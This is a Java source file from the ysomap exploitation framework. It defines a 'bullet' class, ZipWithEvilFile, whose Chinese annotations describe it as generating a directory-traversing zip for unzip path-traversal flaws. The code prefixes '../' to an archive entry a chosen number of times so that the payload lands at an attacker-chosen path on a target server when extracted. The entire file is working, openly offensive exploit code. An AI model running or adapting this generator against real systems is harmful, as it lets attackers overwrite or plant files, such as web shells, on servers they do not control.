package ysomap.bullets.objects;

import org.apache.commons.io.FileUtils;
import ysomap.bullets.AbstractBullet;
import ysomap.bullets.Bullet;
import ysomap.common.annotation.*;

import java.io.File;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.IOException;
import java.util.zip.ZipEntry;
import java.util.zip.ZipOutputStream;

/**
 * @author wh1t3p1g
 * @since 2021/10/11
 */
@Bullets
@Authors({Authors.WH1T3P1G})
@Details("用于生成可跳目录的zip文件，配合解压缩时路径穿越的漏洞")
@Targets({Targets.CODE})
@Dependencies({"*"})
public class ZipWithEvilFile extends AbstractBullet<byte[]> {

    @NotNull
    @Require(name = "depth", type = "int", detail = "需要跳目录的层数")
    public String depth;

    @NotNull
    @Require(name = "localFilepath", detail = "本地需要打包进zip的文件")
    public String localFilepath;

    @NotNull
    @Require(name = "output", detail = "最终生成的文件路径")
    public String output;

    @NotNull
    @Require(name = "remoteFilepath", detail = "远程服务器上传后实际路径，")
    public String remoteFilepath = null;

    @Override
    public byte[] getObject() throws Exception {
        zipFile(output, localFilepath, Integer.parseInt(depth), remoteFilepath);
        return new byte[0];
    }

    public static void zipFile(String zipFilepath, String target, int depth, String filename){
        try (ZipOutputStream zip = new ZipOutputStream(new FileOutputStream(zipFilepath))) {
            File file = new File(target);
            byte[] data = FileUtils.readFileToByteArray(file);

            for(int i=0;i<depth;i++){
                filename = "../" + filename;
            }
            zip.putNextEntry(new ZipEntry(filename));
            zip.write(data);
            zip.closeEntry();
        } catch (FileNotFoundException e) {
            e.printStackTrace();
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    public static Bullet newInstance(Object... args) throws Exception {
        ZipWithEvilFile bullet = new ZipWithEvilFile();
        bullet.set("localFilepath", args[0]);
        bullet.set("depth", args[1]);
        bullet.set("output", args[2]);
        bullet.set("remoteFilepath", args[3]);
        return bullet;
    }

}
